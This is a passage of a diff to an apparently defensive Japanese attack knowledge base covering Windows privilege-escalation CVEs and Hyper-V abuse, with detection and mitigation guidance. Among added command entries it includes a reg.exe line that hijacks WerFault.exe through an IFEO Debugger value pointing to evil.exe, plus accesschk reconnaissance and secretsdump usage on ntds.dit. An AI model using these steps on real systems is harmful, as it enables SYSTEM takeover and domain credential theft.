     "mitigate": "(1) サービス実行ファイル・インストールフォルダへのDACLを棚卸しし、Authenticated Users/Everyone/BUILTIN\\Usersへの書込権限を除去(icacls監査を定期実施)。(2) サービスレジストリキー(HKLM\\SYSTEM\\CurrentControlSet\\Services\\配下)への書込権限を管理者・TrustedInstallerのみに限定。(3) 全サービスのImagePathをダブルクォートで囲む運用を徹底し、新規導入ソフトウェアの受け入れ基準に組み込む(スペースを含むパスは\"C:\\Program Files\\App\\svc.exe\"のようにクォート必須)。(4) GPOでAlwaysInstallElevated(コンピューターの構成・ユーザーの構成の両方)を無効化し、HKLM/HKCU双方のキーを0または未設定に統一、定期的なレジストリベースライン監査で逸脱を検知。(5) WDAC/AppLockerでC:\\直下や書込可能フォルダからの実行を制限。(6) 機微オブジェクトアクセス・レジストリ監査を有効化し7045/7040/4657/4670を収集、SIEM相関ルール化。(7) 定期的にPowerUp/WinPEAS相当のスキャンを防御側でも実施し設定ドリフトを是正。",
@@ -11622,6 +18908,28 @@ AD.I18N.ja.attacks = [
     "summary": "AppLockerのカーネルドライバappid.sysが提供するIOCTLインターフェースの検証不備を突き、既にローカル管理者権限を持つ攻撃者がカーネル任意読み書きプリミティブを獲得する特権昇格脆弱性。これを用いてProtected Process Light(PPL)で保護されたEDR/AVプロセスの保護属性を書き換えて無効化し、SYSTEM/カーネルコンテキストでのコード実行に至る。北朝鮮系Lazarus(Diamond Sleet)がFudModuleルートキットの更新配布のためadmin-to-kernelゼロデイとして実戦投入し、Avastが検知・報告した経緯を持つ。",
     "how": "前提として攻撃者は対象ホスト上で既にローカル管理者相当のコード実行権限を持っている必要があり、リモートから直接悪用できる脆弱性ではない。攻撃者はAppLockerドライバappid.sys(デバイスオブジェクト経由でユーザーモードからアクセス可能なIOCTLインターフェースを公開)のスマートハッシュ計算用IOCTL(制御コード0x22A018、ハンドラAipSmartHashImageFile/AppHashComputeImageHashInternal)に細工した入力バッファを送信する。ドライバは入力バッファ内のオフセット+0x16に格納された値を検証せずコールバック関数ポインタとして呼び出すため、攻撃者はまず任意のカーネルコールバック実行(制御されたアドレスへのカーネルモード実行)を獲得する。このプリミティブで現在スレッドの_KTHREAD構造体内のPreviousModeフィールドを書き換え、以降に発行するNtReadVirtualMemory/NtWriteVirtualMemory等の通常システムコールをカーネルモード発行であるかのようにOSへ誤認させることで、事実上の任意カーネルメモリ読み書きプリミティブを完成させる。このプリミティブを用い、Protected Process Light(PPL)保護下で動作するEDR/AVプロセスのプロテクション属性(EPROCESS構造体のProtection/SignatureLevel等)を書き換えて保護を無効化する。保護が解除されたセキュリティ製品プロセスは通常のユーザーモードAPIから終了・改ざん・アンフックが可能になり、最終的にSYSTEM/カーネルコンテキストでの任意コード実行が成立する。本手法は外部の脆弱な署名済みドライバを持ち込むBYOVD(Bring Your Own Vulnerable Driver)とは異なり、Windows OS標準搭載でAppLocker機能に紐づくappid.sys自体に内在する脆弱性を悪用する点が特徴で、検知回避性が高い。実際の攻撃キャンペーンでは、LazarusグループがFudModuleルートキットの更新版を展開するための初期カーネル昇格手段として本脆弱性を悪用し、Avastの研究者Jan Vojtěšekらが2023年8月にMicrosoftへ報告、2024年2月13日のPatch Tuesdayで修正された(報告から修正まで約半年)。AppLockerポリシーの有効/無効に関わらずappid.sysドライバ自体は多くのWindows環境にロードされ得るため、AppLockerを利用していない環境でも攻撃面として成立し得る。",
     "tools": "FudModuleルートキット(Lazarus/Diamond Sleet独自ツール、公開PoCの流通は限定的)、appid.sys IOCTL(制御コード0x22A018)経由のカーネル任意コールバック/任意読み書きエクスプロイト、Process Hacker/Process Explorer(Protectionカラムによる保護レベルの事後調査用)、WinObj(カーネルオブジェクト/ドライバロード状況の事後調査用)",
+    "cmd": [
+      {
+        "tool": "CVE-2024-21338",
+        "t": "公開PoC(hakaioffsec等)はHVCI有効環境でも動作する無引数実行形式。プロセスイメージ名自体が唯一の強シグナル",
+        "q": "CVE-2024-21338.exe"
+      },
+      {
+        "tool": "Process Explorer",
+        "t": "悪用成功後の事後確認に使う正規Sysinternalsツール。ProtectionカラムでEDR/AVプロセスのPPL保護消失を目視確認",
+        "q": "procexp64.exe"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "appid.sysのファイルバージョンで2024年2月更新(KB非公開)の適用有無を判定。HVCI有効環境でも本脆弱性は影響する点に注意",
+        "q": "Get-Item C:\\\\Windows\\\\System32\\\\drivers\\\\appid.sys | Select-Object -ExpandProperty VersionInfo | Select-Object FileVersion"
+      },
+      {
+        "tool": "AppLocker",
+        "t": "AppLockerポリシーの有効/無効に関わらずappid.sysは多くの環境でロードされるため、利用状況と切り離してドライバ存在を確認する",
+        "q": "Get-AppLockerPolicy -Effective -Xml"
+      }
+    ],
     "detect": "appid.sysをロードするAppIDSvc(Application Identity)サービスの異常な連続クラッシュ・再起動、およびBSOD/カーネルクラッシュダンプの発生をシステムログで監視する。EDR/AVプロセス(MsMpEng.exe、MsSense.exe、サードパーティEDRのサービスプロセス等)に対して通常は拒否されるはずのOpenProcess/TerminateProcess等が非セキュリティ製品プロセスから成功している事象、およびこれらプロセスが予兆なく停止・再起動する事象を相関させる。EDR/AV製品側の自己防御機能(Tamper Protection)が発報するプロセス保護喪失アラートは重要な代理シグナルとなる。appid.sysのファイルバージョンが2024年2月のセキュリティ更新未満のホストを資産管理/パッチ管理データで洗い出し、優先度の高い調査対象とする。",
     "events": "System log Service Control Manager 7031/7034(AppIDSvcの異常終了・再起動)、BugCheck/WER関連イベント(System log 1001, 41 — カーネルクラッシュ/予期しない再起動)、Sysmon 6(appid.sysのドライバロード)、Sysmon 10相当のプロセスアクセス監視(EDR/AVプロセスへの異常なOpenProcess)、EDR/AV製品のTamper Protection/自己防御アラート、Microsoft-Windows-AppLocker運用ログ(8003/8004等、AppLocker利用時)",
     "mitigate": "2024年2月13日のセキュリティ更新(CVE-2024-21338修正パッチ)を全ホストへ最優先で適用する。AppLockerを利用しない環境ではAppIDSvcサービスの起動をGPO等で無効化・制限し、appid.sysのロード面を縮小することを検討する(AppIDSvcはWindows標準コンポーネントであり、依存関係を事前検証した上で実施する)。本脆弱性は外部から持ち込む署名済み脆弱ドライバ(BYOVD)ではなくOS標準搭載のappid.sys自体に内在するため、Microsoft Vulnerable Driver Blocklistでは遮断できない点に注意し、パッチ適用を根本対策として扱う。EDR/AV製品のTamper Protection(自己防御)機能を有効化し、PPL保護状態の継続的な整合性監視を行う。ローカル管理者権限の付与を最小化し、admin-to-kernel攻撃の前提となる初期足場を減らす(LAPS、Just-In-Time管理者昇格等)。",
@@ -11662,6 +18970,28 @@ AD.I18N.ja.attacks = [
     "summary": "既定インストールされたKernel Streaming WOW Thunkサービスドライバks.sys(MSKSSRV.SYS)のプロパティハンドラにおける二重フェッチ(double-fetch/TOCTOU)に起因する未検証ポインタ参照(CVE-2024-35250)を突き、低権限のローカルコード実行を起点に権限コンテキストチェックを迂回してカーネルメモリ操作プリミティブを獲得し、SYSTEM権限へ昇格するLPEプリミティブ。DEVCORE社がPwn2Own Vancouver 2024でフルパッチ済みWindows 11を初日に攻略した手法として注目され、2024年6月の修正後、同年12月にCISA KEVへ収載され実環境での悪用が確認された。ks.sysは音声/映像機能を支えるマルチメディアスタックの一部として多くのWindows 10/11/Server 2022環境に既定で存在し、無効化困難なため影響範囲が広い。",
     "how": "Kernel Streaming(KS)は音声/映像デバイスを扱うWindowsマルチメディア基盤で、既定ロードされるks.sys(MSKSSRV.SYS)は32ビットプロセスがWOW64レイヤー経由で\\Device\\KS系デバイスへ発行したIOCTLを64ビットカーネルへ中継する「WOW Thunk」ドライバとして機能する。KSのIOCTL(IOCTL_KS_PROPERTY等)はMETHOD_NEITHER転送方式を用いるため、カーネルはユーザモードバッファへの生ポインタをそのまま受け取り、本来はProbeForRead/ProbeForWriteで検証してからアクセスする必要がある。CVE-2024-35250は、KSPROPERTY_TYPE_UNSERIALIZESETフラグ付き要求をKspPropertyHandlerが処理する際、まずプロパティセットGUIDをユーザバッファから読み取って許可対象か検証し(1回目のフェッチ)、直後にUnserializePropertySetが同じユーザバッファを再度直接読み取る(2回目のフェッチ)という二重フェッチ(double-fetch/TOCTOU)構造に起因する未検証ポインタ参照(CWE-822)である。攻撃者は検証と実使用の間の競合windowで別スレッドからバッファ内のプロパティセットGUIDを許可された値(例: KSPROPSETID_Service)から別のプロパティセット(例: KSPROPSETID_DrmAudioStream)へ差し替え、KsSynchronousIoControlDeviceの内部呼び出しがRequestorMode=KernelMode(0)として扱われる経路を悪用して、本来ユーザモードから到達できないハンドラ関数を権限チェック迂回で呼び出させる。攻撃者はまずローカルで低権限のコード実行を得た後、SysWOW64配下の32ビットプロセス(WOW64サブシステム)からDeviceIoControlでこの競合を繰り返し発生させ、任意カーネルアドレスの読み書きプリミティブを確立する。得られたカーネルR/Wで対象プロセスのトークンをSYSTEM相当のものへ差し替える、またはEPROCESS構造体を改ざんするなどの手口で呼び出し元プロセスをNT AUTHORITY\\SYSTEMへ昇格させる。DEVCORE社の研究者(Angelboy)はPwn2Own Vancouver 2024(2024年3月)においてこの手法でフルパッチ済みWindows 11を攻略し、コンテスト初日の成果として報告した。Microsoftは2024年6月11日のPatch Tuesdayで修正し、2024年12月16日にはCISA KEVへ収載され(連邦機関への適用期限2025年1月6日)、パッチ未適用環境での実悪用が確認されている。ks.sysはWindows 10/11およびServer 2022の既定インストールに含まれマルチメディア機能を無効化しない限り常時ロードされているため、初期侵入後のpost-exploitation LPEとして汎用性が高い。第三者ドライバを持ち込むBYOVDと異なり組み込みドライバ自体の欠陥であるため、ドライバブロックリストや署名検証では防げずパッチ適用が本質的対策となる。",
     "tools": "DEVCORE Pwn2Own Vancouver 2024 概念実証エクスプロイト(非公開)、汎用カーネルLPEエクスプロイトフレームワーク(ヒープグルーミング/トークン窃取用)、Windows Driver Kit + IOCTLファジングハーネス(ks.sys解析用)、WinDbg(カーネルデバッグ/クラッシュダンプ解析)",
+    "cmd": [
+      {
+        "tool": "CVE-2024-35250",
+        "t": "DEVCORE Pwn2Own 2024の技術詳細を基にした研究者PoCが複数公開されているがCLIオプションは非文書化。無引数実行形式が主流でファイル名自体がシグナル",
+        "q": "CVE-2024-35250.exe"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "ks.sysはマルチメディア機能で常時ロードされ無効化困難。ファイルバージョンで2024年6月更新(KB非公開)の適用有無を判定",
+        "q": "Get-Item C:\\\\Windows\\\\System32\\\\drivers\\\\ks.sys | Select-Object -ExpandProperty VersionInfo | Select-Object FileVersion"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "WOW64経由の32bitプロセスからのIOCTL連打が本質。SysWOW64配下プロセスの棚卸しを異常検知の起点にする",
+        "q": "Get-Process | Where-Object {$_.Path -like '*SysWOW64*'} | Select-Object Id,ProcessName,Path"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認の代替。2024年6月Patch Tuesday(6/11)以降のHotFixインストール日で判定(個別KB非公開)",
+        "q": "Get-HotFix | Where-Object {$_.InstalledOn -ge '2024-06-11'} | Select-Object HotFixID,InstalledOn"
+      }
+    ],
     "detect": "ks.sysは音声/映像アプリで常時使用される組み込みドライバのためドライバロード監視(Sysmon EID6)自体は無意味で、焦点は「SysWOW64(32ビット/WOW64)プロセス起点の異常なKS IOCTL連打」と「トークン窃取の副作用」に置く。SysWOW64配下の32ビットプロセスが\\Device\\KS系ハンドルへDeviceIoControlを高頻度発行した直後に、当該プロセスまたはその子がSYSTEM/High整合性へ昇格する権限逆転(4688でMandatoryLabel/TokenElevationType不整合、consent.exe経由の正規UACを伴わない)を相関する。昇格直後のLSASSアクセス(Sysmon EID10 GrantedAccess 0x1010/0x1450等)や、悪用失敗時のBugcheck(System 1001、ks.sys/ksthunk関連のKERNEL_SECURITY_CHECK_FAILURE等)も強いシグナルとなる。",
     "events": "4688(新規プロセス生成、親子のMandatoryLabel/TokenElevationType不整合), 4672(想定外コンテキストへのSYSTEM相当特権付与), Sysmon EID1(32ビット/WOW64プロセス生成、Image=…\\SysWOW64\\配下), Sysmon EID10(LSASSアクセス), System 1001・Bugcheck 0x139等(悪用失敗時のクラッシュ、ks.sys/ksthunk関与), MDE DeviceProcessEvents(FolderPath SysWOW64, IntegrityLevel)",
     "mitigate": "2024年6月11日のPatch Tuesday該当KBを全Windows 10/11/Server 2022環境へ速やかに適用する。本脆弱性は2024年12月にCISA KEVへ収載され、連邦機関に2025年1月6日までの適用期限が課された経緯があり優先度を最高とする。HVCI(メモリ整合性)/Credential Guardを有効化しトークン窃取後のLSASSアクセスや後続の資格情報窃取を阻害する。ks.sysは無効化不能な組み込みドライバのためドライババン等の緩和策は機能せず、パッチ適用に加え最小権限運用・アプリケーション制御(WDAC)で初期侵入時の低権限コード実行そのものを抑止することが実質的な多層防御となる。",
@@ -11707,6 +19037,28 @@ AD.I18N.ja.attacks = [
     "summary": "Task Schedulerサービスがロードする未文書化の補助RPCインターフェース(WPTaskScheduler.dll、s_TaskSchedulerCreateSchedule/s_TaskSchedulerExecuteSchedule/s_TaskSchedulerDeleteSchedule等の関数を公開。標準文書化されたMS-TSCHのSchRpc*関数とは別経路)が、緩すぎるセキュリティ記述子(ALL APPLICATION PACKAGES=S-1-15-2-1およびEveryone=WDに整合性レベル不問でフルアクセスを許可)のため、AppContainer(低整合性、ブラウザ等のサンドボックスプロセス相当)から直接呼び出せてしまう権限昇格の脆弱性。攻撃者はブラウザ等の別脆弱性でAppContainer内コード実行を得た後、本欠陥を用いてAppContainerの制約を受けないタスクを登録・即時実行させ、同一ログオンユーザーのAppContainer/低整合性からMedium Integrity Level(通常のサンドボックス外ユーザー権限)へ昇格しサンドボックスを脱出する。SYSTEM/Administratorへの直接昇格ではなく、あくまで同一ユーザーアカウント内でのIL(整合性レベル)昇格である点に注意。2024年10月、RomComがFirefox/Tor BrowserのUse-After-Free 0-day(CVE-2024-9680)と連鎖させ実環境で悪用しているのが確認され、CISA KEVに収載された。",
     "how": "Task Schedulerサービス(svchost.exe -k netsvcs配下のschedsvc.dll)は、標準文書化されているMS-TSCHのSchRpc*関数(ITaskSchedulerServiceインターフェース)とは別に、WPTaskScheduler.dllが実装する未文書化の補助RPCインターフェースを公開しており、s_TaskSchedulerCreateSchedule/s_TaskSchedulerExecuteSchedule/s_TaskSchedulerDeleteScheduleといった関数でタスクの登録・実行・削除ができる。修正前のRPCエンドポイントのセキュリティ記述子は`D:P(A;;GA;;;S-1-15-2-1)(A;;GA;;;WD)`であり、S-1-15-2-1(ALL APPLICATION PACKAGES、すなわちAppContainerパッケージ全体)とWD(Everyone)に整合性レベルを問わずフルアクセス(GA)を許可していた。これによりAppContainer内で動作するプロセスも、これらのRPC関数を直接呼び出せてしまう欠陥だった。攻撃者はまず別の脆弱性(RomComのケースではFirefox/Tor Browserのアニメーションタイムライン処理のUse-After-Free、CVE-2024-9680)でAppContainerサンドボックス内の任意コード実行(シェルコード実行)を獲得する。続いてカスタムRPCクライアント(検証実装はPocLowIL.dllという名で報告されている)からs_TaskScheduler*関数を直接呼び出してタスクを登録・即時実行させる。ここで作成されるタスクはSYSTEMや別ユーザーのものではなく、呼び出し元と同一のログオンユーザーのコンテキストで、かつAppContainerのCapability SID制約を受けないMedium Integrity Level(通常のサンドボックス外ユーザー権限)で実行される点が本脆弱性の核心である。これによりAppContainerでは禁止されていたファイルシステム・レジストリ・ネットワークへの通常ユーザー権限アクセスが可能になり、実行されたタスク(RomComの事例ではPowerShell)がC2から次段ペイロードをダウンロード・実行してサンドボックスを脱出する。この経路では管理者資格情報の入力もUACプロンプトの同意も発生しないが、到達する権限はあくまで同一ユーザーのMedium Integrity Levelであり、SYSTEM/Administrator権限そのものへの昇格ではない。Microsoftは2024年11月のセキュリティ更新プログラムで、GAの付与対象をSYSTEM/LOCAL SERVICE(読み書き実行)とNETWORK SERVICE/INTERACTIVE USER(読み取りのみ)に限定し、さらに必須整合性レベルラベル`(ML;;NWNXNR;;;ME)`でMedium Integrity Level未満のプロセスによるアクセスを拒否するよう修正した。CISAは実悪用確認によりKnown Exploited Vulnerabilities(KEV)カタログへ追加し、連邦機関に是正期限を課した。",
     "tools": "RomCom(Storm-0978/UNC2596/Void Rabisu)によるFirefox/Tor Browser 0-day連鎖エクスプロイトチェーン(CVE-2024-9680+CVE-2024-49039、ESETおよびGoogle Threat Analysis Group(Vlad Stolyarov, Bahare Sabouri)が独立に発見しMicrosoftとともに解析・公表)、WPTaskScheduler.dllの未文書化RPCインターフェースを直接呼び出す検証コード(rpcrt4.dll経由でs_TaskSchedulerCreateSchedule等を呼出す公開PoC名: PocLowIL.dll)、Process Monitor/API Monitor(RPC呼出し・タスク登録の挙動解析用)、Sysinternals Sysmon(IntegrityLevelタグの可視化。ただしSysmon/MDEのIntegrityLevelフィールドにAppContainer専用の値はなく、AppContainerプロセスは通常「Low」として記録される点に留意)",
+    "cmd": [
+      {
+        "tool": "schtasks.exe",
+        "t": "悪用後に登録される不審タスクの棚卸し。AppContainer由来プロセスが作成したタスクの詳細表示で作成元プロセスとの相関を確認",
+        "q": "schtasks.exe /query /fo LIST /v"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "脆弱なRPCエンドポイントのセキュリティディスクリプタ確認。修正前はALL APPLICATION PACKAGES(S-1-15-2-1)とEveryoneにフルアクセスが付与されていた",
+        "q": "sc.exe sdshow Schedule"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認の代替。2024年11月Patch Tuesday(11/12)以降のHotFixインストール日で判定(個別KB非公開)",
+        "q": "Get-HotFix | Where-Object {$_.InstalledOn -ge '2024-11-12'} | Select-Object HotFixID,InstalledOn"
+      },
+      {
+        "tool": "Process Monitor",
+        "t": "ESET/Google TAGの調査で使われた正規Sysinternalsツール。WPTaskScheduler.dll経由のRPC呼出しとタスク登録挙動をレジストリ/ファイル操作から相関",
+        "q": "procmon64.exe /AcceptEula /Quiet /Minimized"
+      }
+    ],
     "detect": "Task Scheduler Operationalログでの新規タスク登録(EventID106)およびSecurity 4698を、登録元プロセスの整合性レベルと突き合わせて監視する。通常、ブラウザのコンテンツプロセス(firefox.exe -contentproc、chrome.exe --type=renderer、plugin-container.exe等、AppContainer/低整合性で動作。Sysmon/MDEのIntegrityLevelフィールドではAppContainerも通常「Low」として記録される)がタスクを登録することは正規動作として存在しないため、これらのプロセスがタスク登録イベントの起点(SubjectLogonId/InitiatingProcessでの相関)になっている場合は強いシグナルとなる。CVE-2024-49039の本質は「別アカウント/SYSTEMへの昇格」ではなく「同一ユーザーのAppContainer/低整合性からMedium Integrity Levelへの昇格(サンドボックス脱出)」であるため、タスク登録直後(数分以内)に同一ユーザー・同一ログオンセッションでMedium Integrity Levelの子プロセス(PowerShell等、Operational 200/201、Sysmon 1でIntegrityLevel=Medium)が起動し、AppContainerでは通常不可能なファイル/レジストリ/ネットワークアクセスを行っていることを合わせて確認する。SYSTEM/Administratorコンテキストでの実行を検知条件にすると本脆弱性特有の挙動を見逃す点に注意。MDEではDeviceEventsのActionType=ScheduledTaskCreatedと、DeviceProcessEventsのProcessIntegrityLevel(DeviceId+InitiatingProcessId+作成時刻で相関。InitiatingProcessIntegrityLevelはDeviceEventsではなくDeviceProcessEvents側の列)の組み合わせで検知できる。RPC呼出し自体は新規プロセス生成を伴わないため、プロセス生成ベースのEDRテレメトリのみでは検知が困難な点に留意し、Task Scheduler Operationalログの集中転送・相関を必須とする。",
     "events": "4698(スケジュールタスク作成), 4699(タスク削除), 4702(タスク更新), Microsoft-Windows-TaskScheduler/Operational(106=登録/140=更新/141=削除/200・201=実行開始・終了), 4624(Logon Type 3/2), Sysmon 1(ProcessGuid/IntegrityLevelを含むプロセス生成。AppContainerプロセスは通常IntegrityLevel=Lowとして記録される), MDE DeviceEvents(ActionType=ScheduledTaskCreated)をDeviceProcessEvents(ProcessIntegrityLevel/InitiatingProcessIntegrityLevel)とDeviceId+InitiatingProcessId+InitiatingProcessCreationTimeで相関",
     "mitigate": "2024年11月のセキュリティ更新プログラム(CVE-2024-49039修正)を全Windowsホストへ適用する。CISA KEV収載により連邦機関は是正期限内のパッチ適用が義務付けられるが、民間環境でも同水準の優先度で対応する。ブラウザ側の連鎖元脆弱性(Firefox/Tor Browser CVE-2024-9680等)も含め、ブラウザとOSの両方を最新に保つ。Attack Surface Reduction(ASR)ルールやExploit Protectionでサンドボックスプロセスからの異常なRPC/API呼び出しを制限し、EDRでAppContainer/低整合性プロセスからのタスク登録・その後のMedium IL以上でのプロセス生成をアラート対象に設定する。多層防御として、ブラウザのContent Process/AppContainerのCapability SIDを最小化し、未使用のRPCエンドポイント露出を減らす構成を検討する。",
@@ -11747,6 +19099,33 @@ AD.I18N.ja.attacks = [
     "summary": "Windows Error Reporting(WER)基盤のカーネルモードコンポーネントwerkernel.sysが、クラッシュ処理制御用のレジストリキーをセキュリティディスクリプタNULL(事実上Everyone/Authenticated Usersフルコントロール)で作成してしまう権限管理不備を突き、低権限ユーザーがSYSTEM権限のコード実行を獲得する権限昇格脆弱性(CVSSv3.1 7.8 High)。WERはWindows全エディションの既定コンポーネントであるため攻撃対象範囲が広い。ランサムウェアグループBlack Bastaに関連する侵入者(Symantecの追跡名Cardinal、Microsoft追跡名Storm-1811)が2024年3月のMicrosoft修正公開前からこの欠陥をゼロデイとして侵害後の権限昇格フェーズで実戦投入していたことがBroadcom(Symantec)脅威ハンターチームの調査で確認されており、CISAの既知悪用脆弱性(KEV)カタログにも登録されている。",
     "how": "werkernel.sysはWERのカーネル側処理(クラッシュ検知・ダンプ収集の制御)を担うドライバで、サービス起動時にWER関連のレジストリキーを作成する処理でセキュリティディスクリプタにNULLを指定してしまう実装不備がある。親キーには「CREATOR OWNER」ACEが設定されているため、NULLセキュリティディスクリプタ配下に作成されるサブキーの所有権は作成した(低権限の)プロセスのユーザーに帰属し、事実上Everyone/認証済みユーザーへの書込みが可能になる(NULL DACLはWindowsのアクセス制御上「DACLなし=制限なし全アクセス許可」を意味し、空・Deny AllのDACLとは正反対の挙動)。Symantecが解析したBlack Basta関連の実exploitツールはこれを突き、低権限ユーザーのプロセスからHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe(WerFaultSecure.exeにも同様の経路が存在)キーを作成し、Image File Execution Options(IFEO)の\"Debugger\"値に自身の悪性実行ファイルのパスを設定する。IFEOのDebugger値は本来デバッガのアタッチ用途に使われる正規機能で、OSのプロセス起動処理が対象実行ファイル(ここではWerFault.exe)を起動しようとする際にDebugger値で指定された実行ファイルへ起動先を差し替える。何らかのプロセスクラッシュが発生する(攻撃者が既知のクラッシュ手法・例外誘発で意図的にトリガーすることも可能)とSYSTEM権限で稼働するWerSvc(svchost.exeホスト)がクラッシュハンドラとしてWerFault.exe/WerFaultSecure.exeの起動を試みるが、このときIFEOのリダイレクトが働き、SYSTEM権限のWerSvcが本来のWerFault.exeの代わりに攻撃者の悪性実行ファイルをSYSTEM権限のまま起動してしまう。結果として低権限アカウントによる一度のレジストリ改変だけで、後続のプロセスクラッシュをトリガーにSYSTEM権限のコード実行(シェル奪取)を獲得する。ドライバのロードや追加のネットワークアクセス、ドメイン資格情報を必要とせず、単一ホスト上のローカル低権限アカウントのみで完結する点が実戦的価値を高めている。Microsoftは2024年3月の定例パッチでキーの既定ACLをSYSTEM/Administrators限定に是正した。",
     "tools": "Broadcom(Symantec)脅威ハンターチームが解析したBlack Basta関連侵入者(Cardinal/Storm-1811/UNC4394)の非公開自作エクスプロイトツール(コンパイルタイムスタンプ2023年12月18日・2024年2月27日の2検体を確認)、Sysinternals accesschk(NULL DACL/弱いACLの検出), Sysinternals Process Monitor(レジストリ・プロセスアクティビティ監査), Sysinternals Autoruns(IFEO/WER関連キーの確認), PowerShell(Get-Acl/Set-Acl), WerFault.exe/WerFaultSecure.exe(悪用対象の正規WERバイナリ)",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "IFEOのDebugger値へ自身の悪性実行ファイルを設定する核心操作。`WerFault.exe`キー配下の`Debugger`書換えが決定的シグナル",
+        "q": "reg.exe add \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\WerFault.exe\" /v Debugger /t REG_SZ /d C:\\\\Windows\\\\Temp\\\\evil.exe /f"
+      },
+      {
+        "tool": "accesschk.exe",
+        "t": "Sysinternals製。WER関連レジストリキーのNULL DACL(実質フルアクセス)を悪用前に事前探索する定番手口",
+        "q": "accesschk.exe -kvuqsw \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\""
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認。Win11 23H2/22H2はKB5035853系、Server2022はKB5035857系の適用有無を照合",
+        "q": "Get-HotFix -Id KB5035853"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "IFEO配下のACLを直接検証する代替手段。CREATOR OWNERで作成者=低権限ユーザーに所有権が渡っていないか確認",
+        "q": "Get-Acl 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\WerFault.exe' | Format-List"
+      },
+      {
+        "tool": "WerFault.exe",
+        "t": "IFEOリダイレクトの発火条件。何らかのクラッシュでSYSTEM権限のWerSvcが起動を試みた瞬間に悪性ファイルへ差し替わる",
+        "q": "WerFault.exe -u -p <PID> -s <EVENT_HANDLE>"
+      }
+    ],
     "detect": "非SYSTEM/非TrustedInstallerアカウントによるImage File Execution Options\\WerFault.exe(またはWerFaultSecure.exe)キーへの作成・\"Debugger\"値の設定、およびその他のWER関連レジストリキー(werkernel.sys/WerSvc管理配下)への値書込みを監視し、直後にWerFault.exeまたはWerFaultSecure.exeがSYSTEM権限で起動して通常見られない子プロセス(一時フォルダやユーザー書込み可能パスの実行体、cmd.exe/powershell.exe)を生成していないか相関する。EDRでWerFault.exe/WerFaultSecure.exeの親子プロセス系譜の異常、SYSTEMコンテキストでの予期しない実行ファイルロードを継続的にベースライン比較する。パッチ未適用ホストの洗い出しにはaccesschk等でHKLM配下のWER関連キー・IFEOキーのNULL DACL/Everyone書込みを定期スキャンする。",
     "events": "Sysmon EID 12/13(レジストリキー作成/値設定、対象:Image File Execution Options\\WerFault.exe等のWER関連キー), Sysmon EID 1(WerFault.exe/WerFaultSecure.exeの異常な子プロセス生成), Security 4688(プロセス作成、コマンドライン監査有効時), Security 4672(特権割当), Security 4657(レジストリ値変更、SACL設定時), Application ログ Event ID 1001(Windows Error Reporting報告)",
     "mitigate": "2024年3月のMicrosoft定例パッチ(CVE-2024-26169、Windows 11 23H2/22H2はKB5035853系、Windows Server 2022はKB5035857系等)を全Windows端末・サーバへ適用し、werkernel.sysが管理するレジストリキーの既定ACLをSYSTEM/Administrators限定に是正する。パッチ未適用環境では暫定策としてaccesschk.exe等でHKLM配下のWER関連キー・IFEOキーのNULL DACL/Everyone書込みを監査し、検出したキーへ手動で適切なACLを設定する。ローカル管理者権限・低権限ユーザーの書込み範囲を最小化し、EDRでWerFault.exe/WerFaultSecure.exeの異常な子プロセス生成やIFEO Debugger値の不正設定を検知するルールおよびASR(Attack Surface Reduction)ルールを併用する。",
@@ -11792,6 +19171,38 @@ AD.I18N.ja.attacks = [
     "summary": "仮想化ホスト上のローカル/ドメイン『Hyper-V Administrators』グループのメンバーは、ゲストOS(仮想化されたドメインコントローラを含む)のセキュリティ境界を完全に迂回してVM構成・仮想ディスク・チェックポイントへフルアクセスできる。稼働中の仮想化DCをエクスポート/チェックポイント取得してVHDX/AVHDXをオフラインでマウントし、ntds.ditとSYSTEMハイブを直接読み出せばDCSync相当の全ドメイン資格情報窃取が、ゲスト側の権限もAD監査も一切経由せずに完了する(MITRE ATT&CK T1003.003が実際の侵害事例の手口として明記している経路)。加えてVM削除時にHyper-V管理サービス(VMMS)が非インパーソネートでSYSTEM権限のままアクセス許可を復元する既知の弱点をハードリンクで突けば、ホストOS側の任意のSYSTEM保護ファイルへフルコントロールを獲得しホスト自体でSYSTEM権限のコード実行に昇格できる――Microsoftはこれを『Hyper-V Administratorsはセキュリティ境界として意図されていない』として修正対象外(Won't Fix)としており、パッチでは解消されない設計上の限界である。インフラ運用チームへの過剰委任で発生しがちな見落とされやすい経路であり、BloodHoundの既定収集(AD ACL中心)では可視化されない。",
     "how": "Hyper-V AdministratorsはWindows Server 2012以降の組込みローカルグループ(SID S-1-5-32-578)で、しばしばドメイン管理グループがネストされ、仮想化ホスト上のHyper-V役割に対する完全な管理権限を付与する。このグループのメンバーはPowerShellのHyper-Vモジュール(Get-VM/Export-VM/Checkpoint-VM/Mount-VHD)やHyper-Vマネージャから、ゲスト内部の権限(DCであればDA/EA)を一切要求されずにVM構成ファイル(.vmcx/.vmrs)、仮想ディスク(VHD/VHDX)、チェックポイント差分ディスク(.avhdx)へ到達できる。攻撃者はまずGet-VMで稼働中の仮想化DCを特定し、Export-VM -Name <DC> -Path <出力先>でエクスポート(Windows Server 2016以降のHyper-Vはライブエクスポートに対応しておりVM世代を問わず稼働中のDCを停止させずに取得可能)するか、Checkpoint-VMでスナップショットを取得して.avhdxを生成させる(既定のProduction Checkpointはゲスト内VSS経由でアプリケーション整合性のある取得が可能)。取得したVHDX/AVHDXはMount-VHDやdiskpartでホスト上に直接マウントし、ボリューム内のWindows\\NTDS\\ntds.ditとWindows\\System32\\config\\SYSTEMハイブへファイルシステムレベルでアクセスする――この経路はADのDCSync拡張権限(Replicating Directory Changes)やDC自体の監査・ACLを一切経由しない。抽出したファイルはsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL、またはオフラインのntdsutilでkrbtgtを含む全ドメインアカウントのNTハッシュへ復元でき、Golden 